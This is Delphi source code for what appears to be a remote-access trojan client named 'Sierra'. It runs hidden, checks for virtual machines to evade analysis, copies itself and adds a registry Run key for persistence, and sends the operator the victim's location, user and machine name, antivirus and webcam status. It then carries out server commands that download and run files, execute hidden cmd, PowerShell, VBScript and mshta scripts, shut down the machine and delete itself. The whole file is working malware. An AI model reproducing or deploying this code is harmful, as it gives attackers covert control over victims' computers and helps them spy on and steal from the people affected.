unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, ncSources, IdHTTP, System.JSON, ComObj,
  ActiveX, ShellAPI, System.NetEncoding, Net.HttpClient, IOUtils, Registry,
  TlHelp32;

const
  RegRootKey = HKEY_CURRENT_USER;

type
  TNtSetInformationProcess = function(ProcessHandle: THandle;
    ProcessInformationClass: Integer; ProcessInformation: Pointer;
    ProcessInformationLength: Cardinal): Longint; stdcall;

type
  TForm1 = class(TForm)
    ClientSource: TncClientSource;
    procedure ClientSourceConnected(Sender: TObject; aLine: TncLine);
    function ClientSourceHandleCommand(Sender: TObject; aLine: TncLine;
      aCmd: Integer; const aData: TBytes; aRequiresResult: Boolean;
      const aSenderComponent, aReceiverComponent: string): TBytes;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  MutexHandle: THandle;
  Form1: TForm1;

implementation

{$R *.dfm}

procedure RestartWithAdminRights;
var
  ExecInfo: TShellExecuteInfo;
  FileName: string;
begin
  FileName := ParamStr(0);
  ZeroMemory(@ExecInfo, SizeOf(ExecInfo));
  ExecInfo.cbSize := SizeOf(ExecInfo);
  ExecInfo.fMask := SEE_MASK_FLAG_DDEWAIT or SEE_MASK_FLAG_NO_UI;
  ExecInfo.Wnd := 0;
  ExecInfo.lpFile := PChar(FileName);
  ExecInfo.nShow := SW_SHOWNORMAL;
  ExecInfo.lpVerb := 'runas';

  if ShellExecuteEx(@ExecInfo) then
    Exit;
end;

function GetCountryByIP: string;
var
  HTTP: TIdHTTP;
  Response: string;
  JSONObj: TJSONObject;
begin
  Result := 'Unknown';
  HTTP := TIdHTTP.Create(nil);
  try
    try
      Response := HTTP.Get('http://ip-api.com/json/');
      JSONObj := TJSONObject.ParseJSONValue(Response) as TJSONObject;
      if Assigned(JSONObj) then
        try
          Result := JSONObj.GetValue('country').Value;
        finally
          JSONObj.Free;
        end;
    except
      on E: Exception do
        Result := 'Unknown';
    end;
  finally
    HTTP.Free;
  end;
end;

procedure GetLatLonByIP(out Lat, Lon: string);
var
  HTTP: TIdHTTP;
  Response: string;
  JSONObj: TJSONObject;
begin
  Lat := 'Unknown';
  Lon := 'Unknown';
  HTTP := TIdHTTP.Create(nil);
  try
    try
      Response := HTTP.Get('http://ip-api.com/json/');
      JSONObj := TJSONObject.ParseJSONValue(Response) as TJSONObject;
      if Assigned(JSONObj) then
        try
          Lat := JSONObj.GetValue('lat').ToString;
          Lon := JSONObj.GetValue('lon').ToString;
        finally
          JSONObj.Free;
        end;
    except
      on E: Exception do
      begin
        Lat := 'Unknown';
        Lon := 'Unknown';
      end;
    end;
  finally
    HTTP.Free;
  end;
end;

function GetOSName: string;
var
  BracketPos: Integer;
begin
  Result := TOSVersion.ToString;
  BracketPos := Pos('(', Result);
  if BracketPos > 0 then
    Result := Trim(Copy(Result, 1, BracketPos - 1));
end;

function GetUserAndPCName: String;
var
  UserBuffer, PCBuffer: array [0 .. 255] of Char;
  UserSize, PCSize: DWORD;
begin
  UserSize := 256;
  PCSize := 256;

  if GetComputerName(PCBuffer, PCSize) and GetUserName(UserBuffer, UserSize)
  then
    Result := Format('%s/%s', [UserBuffer, PCBuffer])
  else
end;

function IsAppRunningAsAdmin: String;
var
  hToken: THandle;
  pElevation: TOKEN_ELEVATION;
  dwSize: DWORD;
begin
  Result := 'False';
  if OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken) then
  begin
    try
      if GetTokenInformation(hToken, TokenElevation, @pElevation,
        SizeOf(pElevation), dwSize) then
      begin
        if pElevation.TokenIsElevated = 1 then
          Result := 'True'
        else
          Result := 'False';
      end;
    finally
      CloseHandle(hToken);
    end;
  end;
end;

function GetInstalledAntivirus: String;
var
  FWMIService: OLEVariant;
  FWbemLocator: OLEVariant;
  FWbemObjectSet: OLEVariant;
  FWbemObject: OLEVariant;
  oEnum: IEnumvariant;
  iValue: LongWord;
  AntivirusName: string;
begin
  Result := 'Unknown';
  try
    CoInitialize(nil);
    try
      FWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');
      FWMIService := FWbemLocator.ConnectServer('localhost',
        'root\SecurityCenter2', '', '', '', '', 0);
      FWbemObjectSet := FWMIService.ExecQuery('SELECT * FROM AntiVirusProduct',
        'WQL', 0);

      oEnum := IUnknown(FWbemObjectSet._NewEnum) as IEnumvariant;
      if oEnum.Next(1, FWbemObject, iValue) = 0 then
      begin
        AntivirusName := FWbemObject.DisplayName;
        Result := AntivirusName;
        FWbemObject := Unassigned;
      end;
    finally
      CoUninitialize;
    end;
  except
    on E: Exception do
    begin
      Result := 'Error: ' + E.Message;
    end;
  end;
end;

function IsWebcamPresent: Boolean;
var
  WMIService: OLEVariant;
  DeviceQuery: OLEVariant;
begin
  Result := False;
  try
    CoInitialize(nil);
    try
      WMIService := CreateOleObject('WbemScripting.SWbemLocator');
      WMIService := WMIService.ConnectServer('localhost', 'root\cimv2', '', '',
        '', '', 0);

      DeviceQuery := WMIService.ExecQuery
        ('SELECT * FROM Win32_PnPEntity WHERE Caption LIKE "%Webcam%"',
        'WQL', 0);

      if not VarIsNull(DeviceQuery) and (DeviceQuery.count > 0) then
        Result := True;
    finally
      CoUninitialize;
    end;
  except
    on E: Exception do
      Result := False;
  end;
end;

function IsWebcamPresentStr: string;
begin
  if IsWebcamPresent then
    Result := 'True'
  else
    Result := 'False';
end;

function GetHardwareID: string;
var
  MachineGuid: TGUID;
begin
  CreateGUID(MachineGuid);
  Result := GUIDToString(MachineGuid);
end;

procedure TForm1.ClientSourceConnected(Sender: TObject; aLine: TncLine);
var
  Lat, Lon: string;
begin
  self.ClientSource.ExecCommand(0, BytesOf('NewCon|' + GetCountryByIP + '|' +
    GetUserAndPCName + '|Online|Sierra|' + GetOSName + '|' + IsAppRunningAsAdmin
    + '|1.0.0|' + GetInstalledAntivirus + '|' + IsWebcamPresentStr), False);

  GetLatLonByIP(Lat, Lon);
  self.ClientSource.ExecCommand(0,
    BytesOf('Location|' + Lat + '|' + Lon), False);
end;

function TForm1.ClientSourceHandleCommand(Sender: TObject; aLine: TncLine;
  aCmd: Integer; const aData: TBytes; aRequiresResult: Boolean;
  const aSenderComponent, aReceiverComponent: string): TBytes;
var
  SL: TStringList;
  CmdOutput: string;
  I: Integer;
  ImageData: TBytes;
  FileData: TBytes;
  FileName: string;
  FileStream: TFileStream;
  Writer: TStreamWriter;
  BMP: TBitmap;
  bytestream: TBytesStream;
  RandomFileName: string;
  TempDir, FileExtension: string;
  GUID: TGUID;
begin
  SL := TStringList.Create;
  SL.Delimiter := '|';
  SL.StrictDelimiter := True;
  SL.DelimitedText := stringof(aData);

  if SL[0] = 'RemoteExecuteDisk' then
  begin
    FileData := TNetEncoding.Base64.DecodeStringToBytes(SL[1]);
    CreateGUID(GUID);
    RandomFileName := GUIDToString(GUID) + SL[2];
    TempDir := GetEnvironmentVariable('TEMP');
    if TempDir = '' then
      TempDir := 'C:\Program Files';

    FileName := TempDir + '\' + RandomFileName;
    FileStream := TFileStream.Create(FileName, fmCreate);
    try
      ClientSource.ExecCommand(0, BytesOf('WritingFileToDisk|'), False);
      FileStream.WriteBuffer(FileData[0], Length(FileData));
    finally
      FileStream.Free;
    end;

    ShellExecute(0, 'open', PChar(FileName), nil, nil, SW_SHOWNORMAL);
    ClientSource.ExecCommand(0, BytesOf('FileSucesfullyExecuted|'), False);
  end;

  if SL[0] = 'RemoteExecuteURL' then
  begin
    TThread.Queue(nil,
      procedure
      var
        HttpClient: THTTPClient;
        Response: IHTTPResponse;
        TempFileName: string;
        FileStream: TFileStream;
        FileExtension: string;
        GUID: TGUID;
      begin

        FileExtension := ExtractFileExt(SL[1]);

        if FileExtension = '' then
        begin

          Exit;
        end;

        if CreateGUID(GUID) <> S_OK then
        begin

          Exit;
        end;

        TempFileName := IncludeTrailingPathDelimiter
          (GetEnvironmentVariable('TEMP')) + GUIDToString(GUID) + FileExtension;

        HttpClient := THTTPClient.Create;
        try
          try

            Response := HttpClient.Get(SL[1]);
            self.ClientSource.ExecCommand(0,
              BytesOf('FileDownloadedURL|'), False);

            if not Assigned(Response) or (Response.StatusCode <> 200) then
            begin

              self.ClientSource.ExecCommand(0,
                BytesOf('CantDownloadURL|'), False);
              Exit;
            end;

            FileStream := TFileStream.Create(TempFileName, fmCreate);
            try
              self.ClientSource.ExecCommand(0,
                BytesOf('SavingFileURL|'), False);
              FileStream.CopyFrom(Response.ContentStream,
                Response.ContentStream.Size);
            finally
              FileStream.Free;
            end;

            if FileExists(TempFileName) then
            begin

              if ShellExecute(0, 'open', PChar(TempFileName), nil, nil,
                SW_SHOWNORMAL) <= 32 then
              begin

                self.ClientSource.ExecCommand(0,
                  BytesOf('FailedExecuteURL|'), False);
              end
              else
              begin
                self.ClientSource.ExecCommand(0,
                  BytesOf('FileExecutedURL|'), False);
              end;
            end
            else
            begin

              self.ClientSource.ExecCommand(0,
                BytesOf('FailedExecuteURL|'), False);
            end;

            try

            except
              on E: Exception do
              begin
                self.ClientSource.ExecCommand(0,
                  BytesOf('UnknownErrorURL|' + E.Message), False);
              end;
            end;

          except
            on E: Exception do
            begin
              // Handle unexpected exceptions
              // You can log or display an error message here
            end;
          end;
        finally
          HttpClient.Free;
        end;
      end);
    Exit;
  end;

  if SL[0] = 'BatchScript' then
  begin
    ShellExecute(0, 'open', PChar('cmd.exe'), PChar('/c ' + SL[1]),
      nil, SW_HIDE);
  end;

  if SL[0] = 'VBScript' then
  begin
    TThread.Queue(nil,
      procedure
      var
        TempFileName, ScriptContent: string;
        FileStream: TFileStream;
        WScriptShell: OLEVariant;
        GUID: TGUID;
      begin
        ScriptContent := SL[1];
        TempFileName := TPath.Combine(GetEnvironmentVariable('TEMP'),
          GUIDToString(GUID) + '.vbs');
        try
          FileStream := TFileStream.Create(TempFileName, fmCreate);
          try
            FileStream.Write(Pointer(ScriptContent)^, Length(ScriptContent) *
              SizeOf(Char));
          finally
            FileStream.Free;
          end;
          WScriptShell := CreateOleObject('WScript.Shell');
          WScriptShell.Run('wscript.exe "' + TempFileName + '"', 1, True);
          DeleteFile(PChar(TempFileName));
        except
          on E: Exception do

        end;
      end);
    Exit;
  end;

  if SL[0] = 'PowershellScript' then
  begin
    ShellExecute(0, 'open', 'powershell.exe', PChar('-Command "' + SL[1] + '"'),
      nil, SW_HIDE);
  end;

  if SL[0] = 'Javascript' then
  begin
    ShellExecute(0, 'open', 'mshta.exe',
      PChar('javascript:' + SL[1] + ';close();'), nil, SW_HIDE);
  end;

  if SL[0] = 'Shutdown' then
  begin
    ShellExecute(0, nil, 'cmd.exe', '/C shutdown /s /t 0', nil, SW_HIDE);
    Exit;
  end;

  if SL[0] = 'Restart' then
  begin
    ShellExecute(0, nil, 'cmd.exe', '/C shutdown /r /t 0', nil, SW_HIDE);
    Exit;
  end;

  if SL[0] = 'Logout' then
  begin
    ShellExecute(0, nil, 'cmd.exe', '/C shutdown /l /t 0', nil, SW_HIDE);
    Exit;
  end;

  if SL[0] = 'Sleep' then
  begin
    ShellExecute(0, nil, 'cmd.exe',
      '/C rundll32.exe powrprof.dll,SetSuspendState 0,1,0', nil, SW_HIDE);
    Exit;
  end;

  if SL[0] = 'Hibernate' then
  begin
    ShellExecute(0, nil, 'cmd.exe',
      '/C rundll32.exe powrprof.dll,SetSuspendState Hibernate', nil, SW_HIDE);
    Exit;
  end;

  if SL[0] = 'Close' then
  begin
    ClientSource.Active := False;
    Application.Terminate;
  end;

  if SL[0] = 'RunAs' then
  begin
    if IsAppRunningAsAdmin = 'False' then
    begin
      RestartWithAdminRights;
    end;
  end;

  if SL[0] = 'CommandExecute' then
  begin
    ShellExecute(0, 'open', PChar('cmd.exe'), PChar(SL[1]), nil, SW_HIDE);
  end;

  if SL[0] = 'Uninstall' then
  begin
    ShellExecute(0, 'open', 'cmd.exe',
      PChar('/C ping 127.0.0.1 -n 3 > nul && del "' + ParamStr(0) + '"'),
      nil, SW_HIDE);
    halt;
    Application.Terminate;
  end;

  if SL[0] = 'Halt' then
  begin
    halt;
    Application.Terminate;
  end;

  if SL[0] = 'Reconnect' then
  begin
    ClientSource.Active := False;
    Sleep(10000);
    ClientSource.Active := True;
  end;

end;

procedure CreateRegistryKey(RegKey, ExecPath: string);
var
  Registry: TRegistry;
begin
  Registry := TRegistry.Create;
  try
    Registry.RootKey := HKEY_CURRENT_USER;
    if Registry.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', True)
    then
    begin
      Registry.WriteString(RegKey, ExecPath);
    end;
  finally
    Registry.Free;
  end;
end;

procedure Bruh;
var
  AppPath: string;
  RandomFolder: string;
  NewAppPath: string;
  TaskName: string;
  RegKey: string;
  AppFileName: string;
  RS: TResourceStream;
  settings: AnsiString;
  Loadedsettings: String;
  SL: TStringList;
begin
  RS := TResourceStream.Create(HInstance, 'Settings', RT_RCDATA);
  try
    SetLength(settings, RS.Size);
    RS.ReadBuffer(settings[1], RS.Size);
    Loadedsettings := UTF8Decode(settings);
    SL := TStringList.Create;
    SL.Delimiter := '|';
    SL.StrictDelimiter := True;
    SL.DelimitedText := Loadedsettings;

    AppPath := ExtractFilePath(ParamStr(0));
    AppFileName := ExtractFileName(ParamStr(0));
    if IsAppRunningAsAdmin = 'True' then
    begin
      RandomFolder := 'C:\Program Files\' + SL[4];

      if not DirectoryExists(RandomFolder) then
        CreateDir(RandomFolder);

      NewAppPath := RandomFolder + '\' + SL[5] + '.exe';

      if not CopyFile(PChar(AppPath + AppFileName), PChar(NewAppPath), False)
      then
        // do thing
          ;

      RegKey := SL[5];
      CreateRegistryKey(RegKey, NewAppPath);

    end
    else
    begin
      RandomFolder := GetEnvironmentVariable('APPDATA') + '\' + SL[4];

      if not DirectoryExists(RandomFolder) then
        CreateDir(RandomFolder);

      NewAppPath := RandomFolder + '\' + SL[5];

      if not CopyFile(PChar(AppPath + AppFileName), PChar(NewAppPath), False)
      then
        RaiseLastOSError;

      RegKey := SL[5];
      CreateRegistryKey(RegKey, NewAppPath);
    end;
  finally
    RS.Free;
    SL.Free;
  end;
end;

function VMArtifactsDetect: Boolean;
var
  BadFileNames: array [0 .. 5] of string;
  BadDirs: array [0 .. 1] of string;
  System32Folder, FilePath: string;
  SearchRec: TSearchRec;
  I: Integer;
begin
  BadFileNames[0] := 'VBoxMouse.sys';
  BadFileNames[1] := 'VBoxGuest.sys';
  BadFileNames[2] := 'VBoxSF.sys';
  BadFileNames[3] := 'VBoxVideo.sys';
  BadFileNames[4] := 'vmmouse.sys';
  BadFileNames[5] := 'vboxogl.dll';

  BadDirs[0] := 'C:\Program Files\VMware';
  BadDirs[1] := 'C:\Program Files\oracle\virtualbox guest additions';

  System32Folder := GetEnvironmentVariable('SystemRoot') + '\System32';
  if FindFirst(System32Folder + '\*', faAnyFile, SearchRec) = 0 then
  begin
    try
      repeat
        for I := 0 to High(BadFileNames) do
        begin
          if SameText(SearchRec.Name, BadFileNames[I]) then
          begin
            Result := True;
            Exit;
          end;
        end;
      until FindNext(SearchRec) <> 0;
    finally
      FindClose(SearchRec);
    end;
  end;

  // Check for bad directories
  for I := 0 to High(BadDirs) do
  begin
    if DirectoryExists(BadDirs[I]) then
    begin
      Result := True;
      halt;
      Application.Terminate;
    end;
  end;

  // If no bad files or directories are found, return False
  Result := False;
end;

procedure CheckInternetConnection;
var
  HTTP: TIdHTTP;
begin
  HTTP := TIdHTTP.Create(nil);
  try
    try
      HTTP.Get('http://www.google.com');
    except
      on E: Exception do
      begin
        Application.Terminate;
        halt;
      end;
    end;
  finally
    HTTP.Free;
  end;
end;

function IsOnlyInstanceRunning: Boolean;
var
  RS: TResourceStream;
  settings: AnsiString;
  Loadedsettings: String;
  SL: TStringList;
begin

  RS := TResourceStream.Create(HInstance, 'Settings', RT_RCDATA);
  try
    SetLength(settings, RS.Size);
    RS.ReadBuffer(settings[1], RS.Size);
    Loadedsettings := UTF8Decode(settings);
    SL := TStringList.Create;
    SL.Delimiter := '|';
    SL.StrictDelimiter := True;
    SL.DelimitedText := Loadedsettings;

    MutexHandle := CreateMutex(nil, True, PChar(SL[3]));
  finally
    RS.Free;
    SL.Free;
  end;

  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    Result := False;
  end
  else
  begin
    Result := True;
  end;

end;

procedure TForm1.FormCreate(Sender: TObject);
var
  RS: TResourceStream;
  settings: AnsiString;
  Loadedsettings: String;
  SL: TStringList;
begin
  Hide;
  Application.ShowMainForm := False;
  if not IsOnlyInstanceRunning then
  begin
    halt;
    Application.Terminate;
  end;
  VMArtifactsDetect;
  CheckInternetConnection;
  Bruh;

  RS := TResourceStream.Create(HInstance, 'Settings', RT_RCDATA);
  try
    SetLength(settings, RS.Size);
    RS.ReadBuffer(settings[1], RS.Size);
    Loadedsettings := UTF8Decode(settings);
    SL := TStringList.Create;
    SL.Delimiter := '|';
    SL.StrictDelimiter := True;
    SL.DelimitedText := Loadedsettings;

    ClientSource.Port := strtoint(SL[1]); // Port
    ClientSource.Host := SL[0]; // IP
    ClientSource.EncryptionKey := SL[2]; // encryptyion key

    repeat
      try
        ClientSource.Active := True;
        if ClientSource.Active then
          Break;
      except
        on E: Exception do
        begin
          Sleep(10000);
        end;
      end;
    until False;

  finally
    RS.Free;
    SL.Free;
  end;
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  if MutexHandle <> 0 then
    CloseHandle(MutexHandle);
end;

end.
